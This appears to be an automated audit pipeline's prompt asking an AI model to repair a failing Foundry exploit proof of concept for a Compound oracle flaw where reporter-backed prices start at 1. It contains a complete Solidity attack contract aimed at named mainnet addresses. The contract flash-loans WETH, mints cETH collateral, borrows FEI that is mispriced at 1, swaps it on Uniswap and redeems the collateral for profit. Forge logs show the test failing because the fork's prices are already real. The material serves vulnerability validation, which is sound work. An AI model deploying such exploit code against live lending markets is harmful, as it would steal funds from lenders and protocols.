You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reporter-priced assets are live at a hardcoded price of 1 until their first reporter update
- claim: The constructor initializes every REPORTER market with `prices[symbolHash].price = 1`, and both `price()` and `getUnderlyingPrice()` immediately expose that value with no guard proving the first real reporter update has happened. Because FIXED_ETH assets also derive from `prices[ETH_HASH]`, an uninitialized ETH reporter feed can misprice those markets too.
- impact: If governance wires this oracle into Compound before every reporter-backed market has validated once, affected assets can be valued near zero instead of at market price. That can make borrows appear almost free, collapse collateral value, trigger bad debt, and create liquidation or theft opportunities during rollout or migration.
- exploit_paths: ["Deploy the oracle and list it before all reporter feeds call `validate()` once.", "Borrow a reporter-backed asset whose debt is still priced at `1`, so the account is charged almost no borrow value.", "Or use an uninitialized reporter-backed asset as collateral and watch it be valued near zero, making accounts immediately undercollateralized or unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICEtherLike {
    function comptroller() external view returns (address);
    function mint() external payable;
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function markets(address cToken)
        external
        view
        returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account)
        external
        view
        returns (uint256 error, uint256 liquidity, uint256 shortfall);
    function borrowGuardianPaused(address cToken) external view returns (bool);
    function mintGuardianPaused(address cToken) external view returns (bool);
}

interface IUniswapAnchoredViewLike {
    function numTokens() external view returns (uint256);
    function getTokenConfig(uint256 i)
        external
        view
        returns (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        );
    function prices(bytes32 symbolHash) external view returns (uint248 price, bool failoverActive);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IBalancerFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IBalancerFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier is IBalancerFlashLoanRecipientLike {
    address internal constant TARGET_ORACLE = 0x50ce56A3239671Ab62f185704Caedf626352741e;
    address internal constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address internal constant CFEI = 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

    uint8 internal constant PRICE_SOURCE_REPORTER = 2;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant FLASH_WETH = 0.1 ether;
    uint256 internal constant CETH_DUST = 1_000;

    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 4295128740;
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970341;

    bytes32 internal constant ETH_HASH = keccak256("ETH");
    bytes32 internal constant FEI_HASH = keccak256("FEI");

    struct DebtConfig {
        address cToken;
        address underlying;
        address uniswapMarket;
        bytes32 symbolHash;
        uint8 priceSource;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public path0_oracleListedBeforeValidate;
    bool public path1_borrowReporterBackedDebtPricedAtOne;
    bool public path2_fixedEthAssetsDependOnEthReporter;

    string public exploitPathUsed;
    string public infeasibilityReason;

    bool internal flashActive;
    address internal chosenDebtPool;
    uint256 internal flashRepayAmount;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        (uint248 ethStoredPrice,) = IUniswapAnchoredViewLike(TARGET_ORACLE).prices(ETH_HASH);
        (uint248 feiStoredPrice,) = IUniswapAnchoredViewLike(TARGET_ORACLE).prices(FEI_HASH);

        path2_fixedEthAssetsDependOnEthReporter = ethStoredPrice == 1;
        path1_borrowReporterBackedDebtPricedAtOne = feiStoredPrice == 1;
        path0_oracleListedBeforeValidate =
            path1_borrowReporterBackedDebtPricedAtOne || path2_fixedEthAssetsDependOnEthReporter;
        hypothesisValidated = path0_oracleListedBeforeValidate;
        hypothesisRefuted = !hypothesisValidated;

        if (!path0_oracleListedBeforeValidate) {
            infeasibilityReason =
                "No live target-oracle market on this fork still exposes the constructor-time reporter price of 1.";
            return;
        }

        if (!path1_borrowReporterBackedDebtPricedAtOne) {
            infeasibilityReason =
                "ETH may still be uninitialized for FIXED_ETH markets, but this PoC attempt is constrained to the reporter-backed debt borrow path.";
            return;
        }

        if (!_isHealthyCollateralMarket(CETH)) {
            infeasibilityReason = "cETH cannot be used as live collateral on this fork.";
            return;
        }

        DebtConfig memory debt = _findFeiDebtConfig();
        if (debt.cToken == address(0) || debt.uniswapMarket == address(0) || debt.priceSource != PRICE_SOURCE_REPORTER)
        {
            infeasibilityReason = "cFEI is not present as a reporter-backed market with a live configured anchor pool.";
            return;
        }

        if (_borrowIsPaused(CFEI)) {
            infeasibilityReason = "cFEI borrow is paused on this fork.";
            return;
        }

        uint256 cash = _readCash(CFEI);
        if (cash == 0) {
            infeasibilityReason = "cFEI has no cash to borrow on this fork.";
            return;
        }

        uint256 debtPrice = _readUnderlyingPrice(CFEI);
        uint256 ethPrice = _readUnderlyingPrice(CETH);
        if (debtPrice == 0 || ethPrice == 0) {
            infeasibilityReason = "Oracle price reads failed for cETH or cFEI.";
            return;
        }

        exploitPathUsed =
            "oracle listed before reporter validate() -> flash-loan WETH from Balancer as public funding -> mint healthy cETH collateral -> enter Compound -> borrow reporter-backed FEI still priced at 1 -> dump FEI through its configured public anchor pool -> redeem nearly all cETH because the mispriced debt still consumes almost no liquidity -> repay flash loan";

        chosenDebtPool = debt.uniswapMarket;
        flashActive = true;

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        // The flash loan is only a realistic public funding primitive. The exploit profit still
        // comes from borrowing FEI while Compound values that reporter-backed debt at the
        // constructor default price of 1, then unlocking the collateral again under that same bug.
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "bad-vault");
        require(flashActive, "flash-inactive");
        require(tokens.length == 1 && address(tokens[0]) == WETH, "bad-token");
        require(amounts.length == 1 && amounts[0] == FLASH_WETH, "bad-amount");

        flashRepayAmount = amounts[0] + feeAmounts[0];

        _mintCollateralAndBorrow();
        _redeemCollateralBackoff();
        _sellBorrowedFei();

        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        require(wethBalance >= flashRepayAmount, "insufficient-repay");
        _safeTransfer(WETH, BALANCER_VAULT, flashRepayAmount);

        uint256 remaining = IERC20Like(WETH).balanceOf(address(this));
        if (remaining > MIN_PROFIT) {
            _profitAmount = remaining;
            profitAchieved = true;
        }

        flashActive = false;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        (address expectedPool, address tokenIn) = abi.decode(data, (address, address));
        require(msg.sender == expectedPool, "bad-pool");

        uint256 amountToPay;
        if (amount0Delta > 0) {
            amountToPay = uint256(amount0Delta);
        } else if (amount1Delta > 0) {
            amountToPay = uint256(amount1Delta);
        } else {
            revert("no-delta");
        }

        _safeTransfer(tokenIn, msg.sender, amountToPay);
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;

        path0_oracleListedBeforeValidate = false;
        path1_borrowReporterBackedDebtPricedAtOne = false;
        path2_fixedEthAssetsDependOnEthReporter = false;

        exploitPathUsed = "";
        infeasibilityReason = "";

        flashActive = false;
        chosenDebtPool = address(0);
        flashRepayAmount = 0;
    }

    function _findFeiDebtConfig() internal view returns (DebtConfig memory debt) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            baseUnit;
            fixedPrice;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (cToken == CFEI || underlying == FEI || symbolHash == FEI_HASH) {
                debt = DebtConfig({
                    cToken: cToken,
                    underlying: underlying,
                    uniswapMarket: uniswapMarket,
                    symbolHash: symbolHash,
                    priceSource: priceSource
                });
                return debt;
            }
        }
    }

    function _mintCollateralAndBorrow() internal {
        require(!_mintIsPaused(CETH), "ceth-mint-paused");

        uint256 cEthBefore = ICEtherLike(CETH).balanceOf(address(this));
        IWETHLike(WETH).withdraw(FLASH_WETH);
        ICEtherLike(CETH).mint{value: FLASH_WETH}();
        uint256 cEthMinted = ICEtherLike(CETH).balanceOf(address(this)) - cEthBefore;
        require(cEthMinted != 0, "mint-failed");

        address[] memory markets = new address[](1);
        markets[0] = CETH;
        uint256[] memory enterResults = IComptrollerLike(COMPTROLLER).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter-failed");

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(COMPTROLLER).getAccountLiquidity(address(this));
        require(shortfall == 0 && liquidity != 0, "no-liquidity");

        uint256 debtPrice = _readUnderlyingPrice(CFEI);
        uint256 borrowTarget = _borrowAmountFromLiquidity(liquidity, debtPrice);
        uint256 cash = _readCash(CFEI);
        borrowTarget = _min((borrowTarget * 99) / 100, (cash * 99) / 100);
        require(borrowTarget != 0, "borrow-zero");

        uint256 borrowed = _borrowWithBackoff(borrowTarget);
        require(borrowed != 0, "borrow-failed");
    }

    function _borrowWithBackoff(uint256 attempt) internal returns (uint256 borrowed) {
        for (uint256 i = 0; i < 10; ++i) {
            if (attempt == 0) {
                break;
            }

            uint256 beforeBal = IERC20Like(FEI).balanceOf(address(this));
            uint256 err = ICTokenLike(CFEI).borrow(attempt);
            uint256 afterBal = IERC20Like(FEI).balanceOf(address(this));
            if (err == 0 && afterBal > beforeBal) {
                borrowed = afterBal - beforeBal;
                break;
            }

            attempt = (attempt * 3) / 4;
        }
    }

    function _redeemCollateralBackoff() internal returns (uint256 wethRecovered) {
        uint256 cTokenBalance = ICEtherLike(CETH).balanceOf(address(this));
        if (cTokenBalance <= CETH_DUST) {
            return 0;
        }

        uint256 target = cTokenBalance - CETH_DUST;
        for (uint256 i = 0; i < 10; ++i) {
            if (target == 0) {
                break;
            }

            uint256 ethBefore = address(this).balance;
            uint256 err = ICEtherLike(CETH).redeem(target);
            uint256 ethAfter = address(this).balance;
            if (err == 0 && ethAfter > ethBefore) {
                wethRecovered = ethAfter - ethBefore;
                IWETHLike(WETH).deposit{value: wethRecovered}();
                break;
            }

            target = (target * 3) / 4;
        }
    }

    function _sellBorrowedFei() internal returns (uint256 wethOut) {
        uint256 feiBalance = IERC20Like(FEI).balanceOf(address(this));
        require(feiBalance != 0, "no-fei");

        address token0 = IUniswapV3PoolLike(chosenDebtPool).token0();
        address token1 = IUniswapV3PoolLike(chosenDebtPool).token1();
        require((token0 == FEI && token1 == WETH) || (token0 == WETH && token1 == FEI), "unexpected-pool");

        bool zeroForOne = token0 == FEI;
        uint160 sqrtLimit = zeroForOne ? MIN_SQRT_RATIO_PLUS_ONE : MAX_SQRT_RATIO_MINUS_ONE;

        (int256 amount0, int256 amount1) = IUniswapV3PoolLike(chosenDebtPool)
            .swap(address(this), zeroForOne, int256(feiBalance), sqrtLimit, abi.encode(chosenDebtPool, FEI));

        wethOut = zeroForOne ? uint256(-amount1) : uint256(-amount0);
        require(wethOut != 0, "zero-weth-out");
    }

    function _isHealthyCollateralMarket(address cToken) internal view returns (bool) {
        if (ICTokenLike(cToken).comptroller() != COMPTROLLER) {
            return false;
        }
        if (IComptrollerLike(COMPTROLLER).oracle() != TARGET_ORACLE) {
            return false;
        }
        if (_mintIsPaused(cToken)) {
            return false;
        }

        (bool isListed, uint256 collateralFactorMantissa,) = IComptrollerLike(COMPTROLLER).markets(cToken);
        return isListed && collateralFactorMantissa != 0;
    }

    function _readCash(address cToken) internal view returns (uint256 cash) {
        try ICTokenLike(cToken).getCash() returns (uint256 foundCash) {
            cash = foundCash;
        } catch {}
    }

    function _readUnderlyingPrice(address cToken) internal view returns (uint256 price) {
        try IUniswapAnchoredViewLike(TARGET_ORACLE).getUnderlyingPrice(cToken) returns (uint256 foundPrice) {
            price = foundPrice;
        } catch {}
    }

    function _borrowIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).borrowGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _mintIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).mintGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _borrowAmountFromLiquidity(uint256 liquidity, uint256 debtPrice) internal pure returns (uint256) {
        if (liquidity == 0 || debtPrice == 0) {
            return 0;
        }
        return (liquidity * EXP_SCALE) / debtPrice;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.00s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 212909)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [212909] FlawVerifierTest::testExploit()
    ├─ [2350] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [171630] FlawVerifier::executeOnOpportunity()
    │   ├─ [2575] 0x50ce56A3239671Ab62f185704Caedf626352741e::prices(0xaaaebeba3810b1e6b70781f14b2d72c1cb89c0b2b320c43bb67ff79f562f5ff4) [staticcall]
    │   │   └─ ← [Return] 2957170000 [2.957e9], false
    │   ├─ [2575] 0x50ce56A3239671Ab62f185704Caedf626352741e::prices(0x58c46f3a00a69ae5a5ce163895c14f8f5b7791333af9fe6e7a73618cb5460913) [staticcall]
    │   │   └─ ← [Return] 1001094 [1.001e6], false
    │   └─ ← [Stop]
    ├─ [350] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [371] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19290920 [1.929e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 39.45ms (18.53ms CPU time)

Ran 1 test suite in 47.48ms (39.45ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 212909)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
